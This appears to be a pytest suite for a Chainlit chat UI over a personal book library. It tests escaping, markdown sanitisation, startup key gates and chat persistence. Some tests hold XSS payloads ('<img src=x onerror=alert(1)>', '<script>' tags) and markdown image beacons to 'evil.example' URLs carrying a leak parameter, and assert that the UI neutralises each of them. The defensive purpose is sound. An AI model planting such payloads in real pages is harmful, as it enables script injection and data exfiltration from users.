"""UI rendering contracts that do not need a running Chainlit server.
Skipped when the ui extra is not installed (a plain `uv sync` clone)."""
import asyncio
import importlib
import json
import logging
import os
import subprocess
import sys
import tempfile
import tomllib
from pathlib import Path

import pytest

pytest.importorskip("chainlit")
REPO = Path(__file__).resolve().parents[1]

# Everything ui.py or config reads at import time (same idea as test_local_llm):
# a subprocess test must not inherit the developer's shell or their .env.
UNSET = ("OPENROUTER_API_KEY", "OPENROUTER_ENV_FILE", "ORCHESTRATOR_MODEL", "OPENROUTER_BASE_URL",
         "LLM_BACKEND", "EMBED_BACKEND", "OLLAMA_LLM_MODEL", "OLLAMA_URL", "OLLAMA_EMBED_MODEL",
         "OPENROUTER_EMBED_MODEL", "LIBRARY_DB_PATH", "ASK_LANG", "AYL_STRICT_HIT_ID",
         "AYL_ALLOW_START_WITHOUT_KEY", "AYL_ALLOW_DEFAULT_LOGIN", "AYL_CHAINLIT_DIR",
         "CHAINLIT_AUTH_SECRET", "CHAINLIT_PASSWORD", "LANGCHAIN_TRACING_V2")


def _run(code: str, check=True, **env) -> subprocess.CompletedProcess:
    """Run `code` in a fresh interpreter that can import `ui`, with every config
    input unset and then `env` applied, in a fresh empty directory (load_dotenv
    reads the cwd). check=True: an import-time SystemExit fails the test."""
    base = {k: v for k, v in os.environ.items() if k not in UNSET}
    base["PYTHONPATH"] = str(REPO)
    with tempfile.TemporaryDirectory() as fresh:
        return subprocess.run([sys.executable, "-c", code], capture_output=True, text=True,
                              check=check, env={**base, **env}, cwd=fresh)


@pytest.fixture(autouse=True)
def hosted_backend(monkeypatch):
    """ui.py's startup gate asks preflight, which read the backend from the
    environment once, at import time: a developer whose shell (or .env) says
    LLM_BACKEND=ollama would otherwise test a server whose key gate is off.
    Every test here describes the default backend, except the local-mode one,
    which pins it the other way."""
    monkeypatch.setattr("ask_your_library.preflight.OPENROUTER_NEEDS_KEY", True)


@pytest.fixture
def ui(monkeypatch, tmp_path):
    # ui.py refuses the placeholder password unless the demo login is acknowledged,
    # refuses to start without an OpenRouter key, mints a secret file on import and
    # creates the chat db: all of that goes to tmp, never to the repo's .chainlit/.
    monkeypatch.setenv("CHAINLIT_AUTH_SECRET", "test-secret")
    monkeypatch.setenv("AYL_ALLOW_DEFAULT_LOGIN", "1")
    monkeypatch.setenv("AYL_ALLOW_START_WITHOUT_KEY", "1")
    monkeypatch.setenv("AYL_CHAINLIT_DIR", str(tmp_path / "chainlit"))
    sys.modules.pop("ui", None)
    monkeypatch.syspath_prepend(str(REPO))
    module = importlib.import_module("ui")
    monkeypatch.setattr(module.cl, "run_sync", lambda value: value)
    return module


def test_reflect_step_shows_the_real_stop_reason(ui, monkeypatch):
    shown = []
    monkeypatch.setattr(ui, "show_step", lambda name, text: shown.append((name, text)))
    ui.render_event("reflect", {"current_query": "", "stop_reason": "step limit (5) — wanted to keep searching"})
    assert shown[-1][0] == "reflect" and "step limit" in shown[-1][1]
    ui.render_event("reflect", {"current_query": ""})
    assert "enough" in shown[-1][1]                     # legacy fallback when no reason is given
    ui.render_event("reflect", {"current_query": "more whales"})
    assert "more whales" in shown[-1][1]


def test_badge_is_green_only_when_nothing_is_broken_or_unattributed(ui):
    def badge(**numbers):
        return ui.verification_badge({"verification": "v", "provenance": numbers})

    assert ui.GREEN in badge(checked=3, confirmed=3, broken=0, unattributed=0)
    assert ui.YELLOW in badge(checked=3, confirmed=2, broken=0, unattributed=1)
    assert ui.YELLOW in badge(checked=3, confirmed=2, broken=1, unattributed=0, broken_items=[])
    assert ui.GRAY in badge(checked=0, confirmed=0, broken=0, unattributed=0)


def test_a_catalogue_answer_is_one_step_and_the_titles_render_as_text(ui, monkeypatch):
    shown, sent = [], []
    monkeypatch.setattr(ui, "show_step", lambda name, text: shown.append((name, text)))

    class Msg:
        def __init__(self, content, metadata=None):
            sent.append((content, metadata))

        def send(self):
            return None

    monkeypatch.setattr(ui.cl, "Message", Msg)
    ui.render_event("plan", {"mode": "catalog", "catalog_request": {"op": "list", "title": "", "author": ""},
                             "current_query": "", "queries": []})
    assert shown[-1][0] == "plan" and "operation: list" in shown[-1][1] and "search queries" not in shown[-1][1]
    ui.render_event("catalog", {"answer": "2 books:\n- <b>Moby Dick</b> — Herman Melville",
                                "catalog": {"op": "list", "count": 2, "total": 2, "books": ["x", "y"],
                                            "query": "", "resolved": True, "suggestions": []},
                                "stop_reason": "catalog"})
    assert shown[-1] == ("catalog", "list: 2 of 2 books, from the index tables")
    content, metadata = sent[-1]
    assert "&lt;b&gt;Moby Dick&lt;/b&gt;" in content                   # a crafted title is text, not DOM
    assert metadata == {"catalog": {"op": "list", "count": 2, "total": 2, "query": "", "resolved": True}}
    assert "books" not in metadata["catalog"]                          # the shape rides along, never the list
    ui.render_event("plan", {"mode": "answer", "current_query": "q", "queries": [],
                             "book_filter": "Moby Dick — Herman Melville", "book_unresolved": ""})
    assert "retrieval limited to it" in shown[-1][1]


def test_plan_step_book_names_are_escaped_by_the_real_step_writer(ui, monkeypatch):
    """show_step itself, not a pass-through: a crafted book name in the plan
    step is text, not DOM."""
    import asyncio
    outputs = []

    class Step:
        def __init__(self, name, type=None):
            self.name, self.output = name, ""

        async def __aenter__(self):
            return self

        async def __aexit__(self, *exc):
            outputs.append((self.name, self.output))
            return False

    monkeypatch.setattr(ui.cl, "Step", Step)
    monkeypatch.setattr(ui.cl, "run_sync", lambda coro: asyncio.run(coro))
    ui.render_event("plan", {"mode": "answer", "current_query": "q", "queries": [],
                             "book_filter": "<img src=x onerror=alert(1)> — Nobody", "book_unresolved": ""})
    name, output = outputs[-1]
    assert name == "plan" and "&lt;img src=x onerror=alert(1)&gt;" in output and "<img" not in output


def test_the_badge_of_a_catalogue_answer_is_green_and_names_the_source(ui):
    badge = ui.verification_badge({"verification": "v", "provenance": {
        "checked": 0, "confirmed": 0, "broken": 0, "unattributed": 0,
        "catalog": {"op": "count", "count": 33, "total": 33}}})
    assert ui.GREEN in badge and "Catalogue answer" in badge and "33 of 33 books" in badge
    assert "Quote provenance" not in badge


class FakeSession:
    """cl.user_session outside a Chainlit context: a dict with get/set."""

    def __init__(self):
        self.values = {}

    def get(self, key, default=None):
        return self.values.get(key, default)

    def set(self, key, value):
        self.values[key] = value


def _resumed_history(ui, monkeypatch, thread):
    import asyncio
    session = FakeSession()
    monkeypatch.setattr(ui.cl, "user_session", session)
    asyncio.run(ui.on_chat_resume(thread))
    return session.get("history")


def test_a_resumed_chat_remembers_a_catalogue_answer_by_its_shape_only(ui, monkeypatch):
    """on_chat_resume rebuilds the conversation memory from the persisted steps;
    the catalogue message's metadata (a dict, or the JSON string SQLite hands
    back) keeps the titles out of it, and an ordinary answer stays as text."""
    shape = {"op": "list", "count": 2, "total": 2, "query": "", "resolved": True}
    listing = "2 books in your library (by the index tables):\n- Private Book — Someone\n- Other — Else"
    thread = {"metadata": {"chat_profile": ui.PROFILE_EN}, "steps": [
        {"type": "user_message", "output": "what are my books called?"},
        {"type": "assistant_message", "output": listing, "metadata": {"catalog": shape}},
        {"type": "user_message", "output": "and by author?"},
        {"type": "assistant_message", "output": listing, "metadata": json.dumps({"catalog": shape})},
        {"type": "user_message", "output": "who narrates Moby Dick?"},
        {"type": "assistant_message", "output": "Ishmael [Moby Dick, Chapter 1].", "metadata": "{}"},
    ]}
    history = _resumed_history(ui, monkeypatch, thread)
    assert len(history) == 3
    for entry in history[:2]:
        assert "catalogue answer: list, 2 of 2 books" in entry
        assert "Private Book" not in entry and "Other — Else" not in entry
    assert history[2] == "Q: who narrates Moby Dick?\nA: Ishmael [Moby Dick, Chapter 1]."


def test_the_catalogue_shape_survives_the_data_layer_round_trip(ui, monkeypatch):
    """The real persistence: the message is written through the app's data
    layer into the app's schema and read back with get_thread, then the resume
    handler rebuilds the memory from what came back."""
    import asyncio
    layer = ui.data_layer()
    shape = {"op": "has", "count": 1, "total": 33, "query": "Dracula", "resolved": True}

    # create_step is wrapped by a decorator that queues writes until a live
    # session's first user message; the write itself (the INSERT with the
    # metadata serialized) is what this test exercises, through __wrapped__.
    write_step = type(layer).create_step.__wrapped__

    async def persist_and_read():
        try:
            await layer.update_thread(thread_id="t1", name="do I have Dracula?", metadata={"chat_profile": ui.PROFILE_EN})
            base = {"threadId": "t1", "streaming": False}
            await write_step(layer, {**base, "id": "s1", "name": "admin", "type": "user_message",
                                     "output": "do I have Dracula?", "createdAt": "2026-09-08T20:00:00Z"})
            await write_step(layer, {**base, "id": "s2", "name": "Ask Your Library", "type": "assistant_message",
                                     "output": "Yes, in your library:\n- Dracula — Bram Stoker",
                                     "metadata": {"catalog": shape}, "createdAt": "2026-09-08T20:00:01Z"})
            return await layer.get_thread("t1")
        finally:
            await layer.close()

    thread = asyncio.run(persist_and_read())
    assert thread is not None and len(thread["steps"]) == 2
    history = _resumed_history(ui, monkeypatch, thread)
    assert history == ["Q: do I have Dracula?\nA: (catalogue answer: has, 1 of 33 books; asked about: Dracula, "
                       "found: yes; the list of titles is not kept in the conversation)"]
    assert "Bram Stoker" not in history[0]


def test_ui_import_writes_only_into_its_configured_dir(ui, tmp_path):
    assert (tmp_path / "chainlit" / "chat.db").exists()
    assert ui.CHAINLIT_DIR == tmp_path / "chainlit"


def test_markdown_images_are_neutralized_but_links_survive(ui):
    text = "See ![pixel](https://evil.example/p?d=leak) and [the book](https://example.org/x)"
    out = ui.neutralize_markdown(text)
    assert "evil.example" not in out and "[image removed]" in out and "example.org" in out
    ref = "see ![pixel][x] here\n\n[x]: https://evil.example/p?d=leak"
    out = ui.neutralize_markdown(ref)
    assert "![" not in out and "[pixel][x]" in out          # demoted to a link, never an image
    assert "![" not in ui.neutralize_markdown("![a ![b](u)](v)")


def test_empty_password_refuses_to_start(monkeypatch, tmp_path):
    monkeypatch.setenv("CHAINLIT_AUTH_SECRET", "test-secret")
    monkeypatch.setenv("AYL_ALLOW_DEFAULT_LOGIN", "1")
    monkeypatch.setenv("AYL_ALLOW_START_WITHOUT_KEY", "1")
    monkeypatch.setenv("AYL_CHAINLIT_DIR", str(tmp_path / "chainlit"))
    monkeypatch.setenv("CHAINLIT_PASSWORD", "")
    monkeypatch.syspath_prepend(str(REPO))
    sys.modules.pop("ui", None)
    with pytest.raises(SystemExit):
        importlib.import_module("ui")
    sys.modules.pop("ui", None)


def test_missing_key_refuses_to_start_before_anyone_logs_in(monkeypatch, tmp_path):
    """The preflight in on_chat_start only speaks to a user who is already
    logged in; a keyless server must refuse at startup instead."""
    monkeypatch.setenv("CHAINLIT_AUTH_SECRET", "test-secret")
    monkeypatch.setenv("AYL_ALLOW_DEFAULT_LOGIN", "1")
    monkeypatch.setenv("AYL_CHAINLIT_DIR", str(tmp_path / "chainlit"))
    monkeypatch.delenv("AYL_ALLOW_START_WITHOUT_KEY", raising=False)
    monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
    monkeypatch.delenv("OPENROUTER_ENV_FILE", raising=False)
    # config.OPENROUTER_ENV_FILE was resolved at import time; the key lookup must
    # find nothing whatever the developer running the tests has configured.
    monkeypatch.setattr("ask_your_library.embeddings.OPENROUTER_ENV_FILE", None)
    monkeypatch.syspath_prepend(str(REPO))
    sys.modules.pop("ui", None)
    with pytest.raises(SystemExit) as exit_info:
        importlib.import_module("ui")
    sys.modules.pop("ui", None)
    message = str(exit_info.value)
    assert "OPENROUTER_API_KEY" in message and "AYL_ALLOW_START_WITHOUT_KEY" in message

    # ...and the escape hatch really is the only thing standing in the way.
    monkeypatch.setenv("AYL_ALLOW_START_WITHOUT_KEY", "1")
    sys.modules.pop("ui", None)
    assert importlib.import_module("ui").CHAINLIT_DIR == tmp_path / "chainlit"
    sys.modules.pop("ui", None)


def test_the_fully_local_mode_starts_with_no_key_at_all(tmp_path):
    """The mirror of the test above: LLM_BACKEND=ollama with local embeddings
    needs no OpenRouter account, so the same keyless server must come up —
    without the escape hatch, which is for importing ui.py, not for serving.

    Driven by the environment in a subprocess, not by pinning the derived
    OPENROUTER_NEEDS_KEY: config resolves the backends once, at import time, so
    pinning the flag would test the gate against a value this test wrote itself
    and would survive config deciding the local mode needs a key after all."""
    chainlit_dir = tmp_path / "chainlit"
    code = "import ui; print(ui.CHAINLIT_DIR)"
    # No key of any kind, and no AYL_ALLOW_START_WITHOUT_KEY: the backends alone
    # must carry the import past the gate. check=True => a SystemExit fails here.
    done = _run(code, LLM_BACKEND="ollama", EMBED_BACKEND="ollama",
                CHAINLIT_AUTH_SECRET="test-secret", AYL_ALLOW_DEFAULT_LOGIN="1",
                AYL_CHAINLIT_DIR=str(chainlit_dir))
    assert done.stdout.strip() == str(chainlit_dir)


def test_a_key_from_the_env_file_alone_starts_the_server(monkeypatch, tmp_path, capsys):
    """The startup gate must accept the documented OPENROUTER_ENV_FILE route,
    not only an exported variable — and read that file once, without ever
    putting the key on screen."""
    key_file = tmp_path / "openrouter.env"
    secret = "test-key-value-0123456789"     # neutral: the snapshot guard rejects real key prefixes
    key_file.write_text(f'OPENROUTER_API_KEY="{secret}"\n')

    monkeypatch.setenv("CHAINLIT_AUTH_SECRET", "test-secret")
    monkeypatch.setenv("AYL_ALLOW_DEFAULT_LOGIN", "1")
    monkeypatch.setenv("AYL_CHAINLIT_DIR", str(tmp_path / "chainlit"))
    # No escape hatch and no exported key: the env file is the only way through.
    monkeypatch.delenv("AYL_ALLOW_START_WITHOUT_KEY", raising=False)
    monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
    # config resolved OPENROUTER_ENV_FILE at import time, so point the lookup
    # at the tmp file the way the running process would have it.
    monkeypatch.setattr("ask_your_library.embeddings.OPENROUTER_ENV_FILE", key_file)

    reads = []
    real_read_text = Path.read_text

    def counting_read_text(self, *args, **kwargs):
        if self == key_file:
            reads.append(self)
        return real_read_text(self, *args, **kwargs)
    monkeypatch.setattr(Path, "read_text", counting_read_text)

    monkeypatch.syspath_prepend(str(REPO))
    sys.modules.pop("ui", None)
    try:
        module = importlib.import_module("ui")      # no SystemExit: the gate is satisfied
        assert module.CHAINLIT_DIR == tmp_path / "chainlit"
    finally:
        sys.modules.pop("ui", None)

    assert len(reads) == 1, f"the key file was read {len(reads)} times, expected once"
    captured = capsys.readouterr()
    assert secret not in captured.out and secret not in captured.err

def test_partial_metrics_are_shown_but_not_added_to_the_session_cost(ui, monkeypatch):
    """A run paused at a clarify reports its cost so far; the final event covers
    the whole run, so only that one accumulates."""
    import asyncio

    store = {}
    monkeypatch.setattr(ui.cl, "user_session", type("S", (), {"get": staticmethod(lambda k: store.get(k)),
                                                             "set": staticmethod(lambda k, v: store.__setitem__(k, v))})())
    sent = []

    class Msg:
        def __init__(self, content, **kw):
            sent.append(content)
        async def send(self):
            return None
    monkeypatch.setattr(ui.cl, "Message", Msg)
    base = {"model": "m", "llm_calls": 3, "input_tokens": 10, "output_tokens": 2, "cache_read_tokens": 0,
            "by_role": {}, "hits_seen": 0, "evidence_distilled": 0, "redacted_lines": 0, "evidence_dropped_no_hit": 0}
    asyncio.run(ui.show_metrics({**base, "cost_usd": 0.01, "seconds": 5, "steps_taken": 1, "partial": True}))
    assert store.get("session_cost") in (None, 0.0) and "so far" in sent[-1]
    asyncio.run(ui.show_metrics({**base, "cost_usd": 0.03, "seconds": 9, "steps_taken": 2, "stop_reason": "enough"}))
    assert abs(store["session_cost"] - 0.03) < 1e-9 and "so far" not in sent[-1]


def test_plan_step_says_when_the_planner_fell_back_to_the_raw_question(ui, monkeypatch):
    from ask_your_library.i18n import t
    shown = []
    monkeypatch.setattr(ui, "show_step", lambda name, text: shown.append((name, text)))
    ui.render_event("plan", {"mode": "answer", "current_query": "q", "queries": []})
    ui.render_event("plan", {"mode": "answer", "current_query": "q", "queries": [], "plan_fallback": True})
    assert t("ui_plan_fallback") not in shown[0][1] and t("ui_plan_fallback") in shown[1][1]


def test_every_evidence_item_opens_on_the_passage_it_was_checked_against(ui, monkeypatch):
    """After the badge, one <details> per retrieved passage: book, section, hit id
    and verdict counts in the summary; every quote with its verdict inside, then the
    passage from the act events. Corpus text is escaped, image-free and carries no
    raw line break (a blank line would end the HTML block and spill the passage
    into the chat as markdown); a passage the run never showed says so."""
    from ask_your_library.i18n import t
    sent = []

    class Msg:
        def __init__(self, content, **kw):
            sent.append(content)
        async def send(self):
            return None
    monkeypatch.setattr(ui.cl, "Message", Msg)
    monkeypatch.setattr(ui, "show_step", lambda name, text: None)
    view = ui.RunView()
    passage = "## Plot\n\nCall me Ishmael. <script>alert(1)</script>\n\n- **Ahab** ![x](http://evil/x.png)"
    ui.render_event("act", {"steps_taken": 1, "hits": [], "hits_log": [{"hit_id": "s1h1", "text": passage}]}, view=view)
    ui.render_event("validate", {"verification": "OK", "provenance": {
        "checked": 3, "confirmed": 1, "unattributed": 0, "broken": 2, "unused": 0, "broken_items": [],
        "items": [{"hit_id": "s1h1", "book": "Moby Dick — Herman Melville", "section": "Chapter 1",
                   "quote": "Call me Ishmael.", "status": "confirmed"},
                  {"hit_id": "s1h1", "book": "Moby Dick — Herman Melville", "section": "Chapter 1",
                   "quote": "Ishmael was a lawyer.", "status": "broken"},
                  {"hit_id": "s9h9", "book": "B — A", "section": "s", "quote": "gone", "status": "broken"}]}}, view=view)
    assert len(sent) == 2                                    # the badge, then the evidence list
    block = sent[1]
    assert block.count("<details>") == 2                      # two passages for three items
    assert t("ui_evidence_title", n=3, p=2) in block
    assert f"{t('ev_status_confirmed')} 1" in block and f"{t('ev_status_broken')} 1" in block   # per-passage counts
    assert "<code>s1h1</code>" in block and "<q>Call me Ishmael.</q>" in block and "<q>Ishmael was a lawyer.</q>" in block
    assert "&lt;script&gt;" in block and "<script>" not in block and "![x]" not in block
    assert "\n" not in block and "<br><br>" in block          # no blank line can end the HTML block
    assert "## Plot" in block                                 # the heading text survives, as text
    assert t("ui_passage_missing") in block                  # s9h9 was never in this run
    # views are per question and do not mix: a second view has no passages
    other = ui.RunView()
    ui.render_event("validate", {"verification": "OK", "provenance": {"items": [
        {"hit_id": "s1h1", "book": "b", "section": "s", "quote": "q", "status": "confirmed"}]}}, view=other)
    assert t("ui_passage_missing") in sent[-1] and "Call me Ishmael" not in sent[-1]


def test_badge_broken_quotes_are_neutralized_and_single_line(ui):
    badge = ui.verification_badge({"verification": "x", "provenance": {
        "checked": 1, "confirmed": 0, "unattributed": 0, "broken": 1, "unused": 0,
        "broken_items": [{"hit_id": "s1h1", "book": "B", "section": "s", "quote": "line one\n\n![x](http://evil/x.png)"}]}})
    assert "line one<br><br>[image removed]" in badge and "![x]" not in badge


# --- chat persistence: the thread insert that carries the title -----------------

CHAINLIT_CONFIG = REPO / ".chainlit" / "config.toml"


def _tags_as_the_emitter_sends_them(profile: str) -> list[str] | None:
    """chainlit.emitter.flush_thread_queues: the insert that saves a chat's title on
    its first message also carries tags=[chat profile] when features.auto_tag_thread
    is on. Read from the repo's config file, not from chainlit's loaded config, so
    the test describes the shipped file whatever the working directory is."""
    features = tomllib.loads(CHAINLIT_CONFIG.read_text(encoding="utf-8"))["features"]
    return [profile] if features.get("auto_tag_thread", True) else None


async def _thread_row(layer, thread_id: str):
    rows = await layer.execute_sql('SELECT "name", "tags" FROM threads WHERE "id" = :id',
                                   {"id": thread_id})
    return rows[0] if rows else None


def _insert_and_read(layer, thread_id: str, tags) -> dict | None:
    """One thread insert through the layer, then the row; the layer's engine is
    disposed in the same loop, so no aiosqlite connection outlives the test."""
    async def go():
        try:
            await layer.update_thread(thread_id=thread_id, name="How many books do I have?",
                                      tags=tags, metadata={})
            return await _thread_row(layer, thread_id)
        finally:
            await layer.close()
    return asyncio.run(go())


def test_first_message_persists_the_chat_title(ui):
    """The data layer as ui.py builds it, the schema as ui.py creates it, the
    title-carrying insert of a chat's first message with the tags the shipped
    config makes the emitter send (the emitter also passes the user; that
    needs a session and changes nothing about the tags column): the title must
    land in the table the sidebar lists."""
    row = _insert_and_read(ui.data_layer(), "t1", _tags_as_the_emitter_sends_them(ui.PROFILE_EN))
    assert row == {"name": "How many books do I have?", "tags": None}


def test_sqlite_still_rejects_a_tag_list_so_auto_tag_thread_stays_off(ui, caplog):
    """Why the flag is off: the data layer binds the list as-is, SQLite refuses it,
    and execute_sql only logs the failure, so the whole insert, title included,
    is lost. Both halves are pinned: no row, AND the logged reason is the list
    binding (execute_sql swallows every error, so the missing row alone would
    also pass on an unrelated breakage). The day this test fails, upstream
    serializes tags for SQLite and auto_tag_thread can go back on."""
    with caplog.at_level(logging.WARNING, logger="chainlit"):
        row = _insert_and_read(ui.data_layer(), "t2", [ui.PROFILE_EN])
    assert row is None
    assert "type 'list' is not supported" in caplog.text


def test_config_keeps_auto_tag_thread_off():
    features = tomllib.loads(CHAINLIT_CONFIG.read_text(encoding="utf-8"))["features"]
    assert features["auto_tag_thread"] is False, (
        "auto_tag_thread = true loses every chat title on SQLite; see "
        "test_sqlite_still_rejects_a_tag_list_so_auto_tag_thread_stays_off")

